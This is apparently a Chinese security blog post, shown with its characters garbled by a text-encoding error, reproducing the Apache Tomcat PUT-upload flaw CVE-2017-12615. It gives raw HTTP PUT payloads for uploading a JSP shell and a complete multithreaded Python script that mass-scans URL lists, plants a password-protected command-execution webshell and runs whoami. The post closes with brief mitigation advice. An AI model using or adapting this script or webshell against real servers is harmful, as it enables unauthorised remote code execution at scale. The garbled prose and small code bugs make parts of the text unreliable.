---
title: Tomcatæ–‡ä»¶ä¸Šä¼ (CVE-2017-12615)å¤ç°(å¯æ”»å‡»7.0.81 & å¸¦POC)
date: 2017-09-20 11:01:08
tags: æ–‡ä»¶ä¸Šä¼ ;tomcat
---
## æ¼æ´æ¦‚è¿°
**è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-12615ï¼‰    å½±å“ï¼š Apache Tomcat 7.0.0 - 7.0.79ï¼ˆ7.0.81ä¿®å¤ä¸å®Œå…¨ï¼‰**

å½“ Tomcat è¿è¡Œåœ¨ Windows ä¸»æœºä¸Šï¼Œä¸”å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼‰ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ã€‚ä¹‹åï¼ŒJSP æ–‡ä»¶ä¸­çš„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚

<!-- more -->
## åŸºæœ¬ä¿¡æ¯
æ¼æ´åç§°ï¼šTomcatä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´

æ¼æ´ç¼–å·ï¼šCVE-2017-12615

æ¼æ´å½±å“ï¼šä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„æ–‡ä»¶ï¼Œå¹¶è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚

å½±å“å¹³å°ï¼šWindows/Linux

å½±å“ç‰ˆæœ¬ï¼šApache Tomcat <= 7.0.81 | Apache Tomcat <= 8.5.20 | Apache Tomcat <= 9.0.0.M26

## åŸç†åˆ†æ
æœ¬æ¼æ´æ¶‰åŠåˆ° DefaultServletå’Œ JspServletï¼ŒDefaultServletçš„ä½œç”¨æ˜¯å¤„ç†é™æ€æ–‡ä»¶ ï¼ŒJspServlet çš„ä½œç”¨æ˜¯å¤„ç†jsp ä¸jspx æ–‡ä»¶çš„è¯·æ±‚ï¼ŒåŒæ—¶DefaultServlet å¯ä»¥å¤„ç† PUT æˆ– DELETEè¯·æ±‚ã€‚

é™¤äº†jspå’Œjspxé»˜è®¤æ˜¯ç”±org.apache.jasper.servlet.JspServletå¤„ç†ï¼Œå…¶ä»–é»˜è®¤éƒ½æ˜¯ç”±org.apache.catalina.servlets.DefaultServletæ¥å¤„ç†ã€‚

å³ä½¿è®¾ç½®readonlyä¸ºfalseï¼Œé»˜è®¤tomcatä¹Ÿä¸å…è®¸PUTä¸Šä¼ jspå’Œjspxæ–‡ä»¶çš„ï¼Œå› ä¸ºåç«¯éƒ½ç”¨org.apache.jasper.servlet.JspServletæ¥å¤„ç†jspæˆ–æ˜¯jspxåç¼€çš„è¯·æ±‚äº†ï¼Œè€ŒJspServletä¸­æ²¡æœ‰PUTä¸Šä¼ çš„é€»è¾‘ï¼ŒPUTçš„ä»£ç å®ç°åªå­˜åœ¨äºDefaultServletä¸­ã€‚

è¿™ä¸ªæ¼æ´çš„æ ¹æœ¬æ˜¯é€šè¿‡æ„é€ ç‰¹æ®Šåç¼€åï¼Œç»•è¿‡äº†tomcatæ£€æµ‹ï¼Œè®©å®ƒç”¨DefaultServletçš„é€»è¾‘å»å¤„ç†è¯·æ±‚ï¼Œä»è€Œä¸Šä¼ jspæ–‡ä»¶ã€‚

ç›®å‰ä¸»è¦ä¸‰ç§æ–¹æ³•ï¼š

l evil.jsp%20

l evil.jsp::$DATA

l evil.jsp/


## å¤ç°è¿‡ç¨‹
- ### 0x00 å®‰è£…Tomcat 7.0.79
![img](Tomcatæ–‡ä»¶ä¸Šä¼ -CVE-2017-12615-å¤ç°/ScreenShot01.png)

- ### 0x01 å¼€å¯HTTP PUT

ä¿®æ”¹Tomcat 7.0/conf/web.xmlæ–‡ä»¶
æ·»åŠ readonlyå±æ€§ï¼Œä½¿è€…readonly=false.
```xml
    <servlet>
        <servlet-name>default</servlet-name>
        <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
        <init-param>
            <param-name>debug</param-name>
            <param-value>0</param-value>
        </init-param>
        <init-param>
            <param-name>listings</param-name>
            <param-value>false</param-value>
        </init-param>
        <init-param>
            <param-name>readonly</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>1</load-on-startup>
    </servlet>
```
ç„¶åï¼Œé‡å¯Tomcatã€‚

- ### 0x02 ä»»æ„æ–‡ä»¶ä¸Šä¼  Â· å§¿åŠ¿ä¸€
æ€è·¯ï¼šå‚è€ƒå¾®è½¯MSDNä¸Šå…³äºNTFS Streamsçš„ä¸€æ®µèµ„æ–™[https://msdn.microsoft.com/en-us/library/dn393272.aspx](https://msdn.microsoft.com/en-us/library/dn393272.aspx)
```
All files on an NTFS volume consist of at least one stream - the main stream â€“ this is the normal, viewable file in which data is stored. The full name of a stream is of the form below.

    <filename>:<stream name>:<stream type>

The default data stream has no name. That is, the fully qualified name for the default stream for a file called "sample.txt" is "sample.txt::$DATA" since "sample.txt" is the name of the file and "$DATA" is the stream type.
```

payload ::
```
PUT /111.jsp::$DATA HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...
```
![img](Tomcatæ–‡ä»¶ä¸Šä¼ -CVE-2017-12615-å¤ç°/ScreenShot02.png)
å†™å…¥æˆåŠŸï¼

- ### 0x03 ä»»æ„æ–‡ä»¶ä¸Šä¼  Â· å§¿åŠ¿äºŒ ï¼ˆå¯æ”»å‡»Tomcat 7.0.81ï¼‰

æ€è·¯ï¼šå¯ä»¥ä¸Šä¼ jSpæ–‡ä»¶(ä½†ä¸èƒ½è§£æ)ï¼Œå´ä¸å¯ä¸Šä¼ jspã€‚ è¯´æ˜tomcatå¯¹jspæ˜¯åšäº†ä¸€å®šå¤„ç†çš„ã€‚é‚£ä¹ˆå°±è€ƒè™‘æ˜¯å¦å¯ä»¥ä½¿å…¶å¤„ç†è¿‡ç¨‹ä¸­å¯¹æ–‡ä»¶åçš„è¯†åˆ«å­˜åœ¨å·®å¼‚æ€§ï¼Œå‰é¢çš„æµç¨‹ä¸­ test.jsp/ è¯†åˆ«ä¸ºéjspæ–‡ä»¶ï¼Œè€Œåç»­ä¿å­˜æ–‡ä»¶çš„æ—¶å€™ï¼Œæ–‡ä»¶åä¸æ¥å—/å­—ç¬¦ï¼Œæ•…è€Œå¿½ç•¥æ‰ã€‚

payload ::
```
PUT /222.jsp/ HTTP/1.1
Host: 10.1.1.6:8080
User-Agent: JNTASS
DNT: 1
Connection: close

...jsp shell...
```
![img](Tomcatæ–‡ä»¶ä¸Šä¼ -CVE-2017-12615-å¤ç°/ScreenShot06.png)
å†™å…¥æˆåŠŸï¼

- ### 0x04 èœåˆ€è¿æ¥

![img](Tomcatæ–‡ä»¶ä¸Šä¼ -CVE-2017-12615-å¤ç°/ScreenShot04.png)


## æ‰¹é‡EXPè„šæœ¬
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import sys
import time
import threading
import queue
import re
from lxml import html

class Attacker(object):
    def __init__(self,urlList,threads,output):
        self.urlList=urlList
        self.threads=threads
        self.optput=output
        self.print_lock=threading.Lock()
        self.savaFile_lock=threading.Lock()

    def run_thread(self):
        thread_arr=[]
        for i in range(self.threads):
            t=threading.Thread(target=self.attack)
            thread_arr.append(t)
        for i in range(self.threads):
            thread_arr[i].start()
        for i in range(self.threads):
            thread_arr[i].join()
    def saveResultToFile(self,message):
        if self.optput is not None:
            with open(self.optput, 'a+', encoding = 'utf8') as f:  # ä»¥è¿½åŠ çš„æ–¹æ³•ç»“æœå†™å…¥æ–‡ä»¶
                f.write(message[0]+"\t")
                f.write(message[1]+"\n")

    def attack(self):
        body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
        +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("W3akPassw0rd".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''

        while not self.urlList.empty():

            url=self.urlList.get()
            protocol=re.search(r"(https?)\:\/\/(.*?)\/",url+"/").group(1)
            host=re.search(r"(https?)\:\/\/(.*?)\/",url+"/").group(2)
            self.print_lock.acquire()
            print(" \b\b"*100,end="")
            print("\r[about "+str(self.urlList.qsize())+" left]\t"+"trying attack :: "+protocol+"://"+host,end="")
            self.print_lock.release()
            try:

                req = requests.options(url=protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c",timeout=10)
                if 'allow' in req.headers and req.headers['allow'].find("PUT")>0 :
                    uploadevil=requests.put(url=protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp/",data=body,timeout=10)
                    if (uploadevil.status_code == 201) or (uploadevil.status_code == 204):
                        execWhoami=requests.get(url=protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&cmd=whoami",timeout=10)
                        #print(execWhoami.text)
                        #whoami=re.search(r"<pre>(.*)<\/pre>",execWhoami.text).group(1)
                        whoami=html.fromstring(execWhoami.text).text_content()
                        self.print_lock.acquire()
                        print(" \b\b"*100,end="")
                        print("\rğŸ»   "+protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp?pwd=W3akPassw0rd&cmd=whoami\t"+whoami)
                        if self.optput is not None:
                            self.saveResultToFile((protocol+"://"+host+"/b4acde76d8daf7a7b3b55670ed4f245c.jsp",whoami))
                        self.print_lock.release()
                    
                    else:
                        pass
                else:
                    pass
            except:
                pass
                #self.print_lock.acquire()
                #print("\tFailed...   Next...")
                #self.print_lock.release()
        print(" \b\b"*100,end="")

def readUrls(listFile):
    fd=open(listFile,"rb")
    lines=fd.readlines()
    fd.close()

    urlList=queue.Queue()

    for url in lines:
        urlList.put(url.decode("ascii"))
    return urlList

def main():
    headCharPic="\r        .--.\n       |o_o |    ------------------ \n       |:_/ |   < Author: Mr.Bingo >\n      //   \ \   ------------------ \n     (|     | ) <    oddboy.cn     >\n    /'\_   _/`\  ------------------\n    \___)=(___/\n"
    print(headCharPic)
    # Creating a parser
    parser=argparse.ArgumentParser()

    groupUser = parser.add_mutually_exclusive_group(required=True)
    groupUser.add_argument('-u',dest="url",help="target url")
    groupUser.add_argument('-U',dest='urlFile',help="url list file")
    parser.add_argument('-t',dest="threads",default=1,type=int,help="threads")
    parser.add_argument('-o',dest="outFile",help="output results")

    args=parser.parse_args()

    if args.urlFile is not None:
        urlList=readUrls(args.urlFile)
    else:
        urlList=queue.Queue()
        urlList.put(args.url)
    if args.outFile is not None:
        filePath,fileName=os.path.split(fileFullPath)
        if (filePath!="") and (not os.path.exists(filePath)):
            os.mikedirs(filePath)   # è‹¥ä¸å­˜åœ¨è¿™ä¸ªç›®å½•åˆ™é€’å½’åˆ›å»º
    
    Attacker_obj=Attacker(urlList,args.threads,args.outFile)
    Attacker_obj.run_thread()

if __name__ == '__main__':
    main()
    print("\n@@@   Done   @@@")
```
![img](Tomcatæ–‡ä»¶ä¸Šä¼ -CVE-2017-12615-å¤ç°/ScreenShot05.png)

## æ¼æ´æ€»ç»“

è¯¥æ¼æ´åˆ©ç”¨çš„å‰ææ¡ä»¶éœ€è¦æ‰‹åŠ¨å¼€å¯readOnlyåŠŸèƒ½ï¼Œä»¥æ”¯æŒä¸Šä¼ æ“ä½œï¼Œé»˜è®¤é…ç½®çš„æƒ…å†µä¸‹æ˜¯æ— æ³•æˆåŠŸåˆ©ç”¨æ¼æ´ï¼Œä»å®é™…æµ‹è¯•æ¥çœ‹ï¼Œæ¼æ´å±å®³æ€§å¹¶æ²¡æœ‰é‚£ä¹ˆé«˜ã€‚ä½†æ˜¯å¦‚æœç”¨æˆ·ä¸€æ—¦å¯ç”¨äº†readOnlyåŠŸèƒ½ï¼Œé»‘å®¢å¯åˆ©ç”¨æ¼æ´æˆåŠŸå…¥ä¾µã€‚

æ ¹æ®ä¸šåŠ¡è¯„ä¼°é…ç½®conf/webxmlæ–‡ä»¶çš„readOnlyå€¼ä¸ºTureæˆ–æ³¨é‡Šå‚æ•°ï¼Œç¦ç”¨PUTæ–¹æ³•å¹¶é‡å¯tomcatæœåŠ¡ï¼Œä¸´æ—¶è§„é¿å®‰å…¨é£é™©ï¼›
æ³¨æ„ï¼š å¦‚æœç¦ç”¨PUTæ–¹æ³•ï¼Œå¯¹äºä¾èµ–PUTæ–¹æ³•çš„åº”ç”¨ï¼Œå¯èƒ½å¯¼è‡´ä¸šåŠ¡å¤±æ•ˆã€‚


## å‚è€ƒé“¾æ¥

- [NTFS Streams | https://msdn.microsoft.com/en-us/library/dn393272.aspx](https://msdn.microsoft.com/en-us/library/dn393272.aspx)
- [http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81](http://tomcat.apache.org/security-7.html#Fixed_in_Apache_Tomcat_7.0.81)

- [Tomcatä¿¡æ¯æ³„æ¼å’Œè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†ææŠ¥å‘Šï¼ˆCVE-2017-12615/CVE-2017-12616ï¼‰](https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ)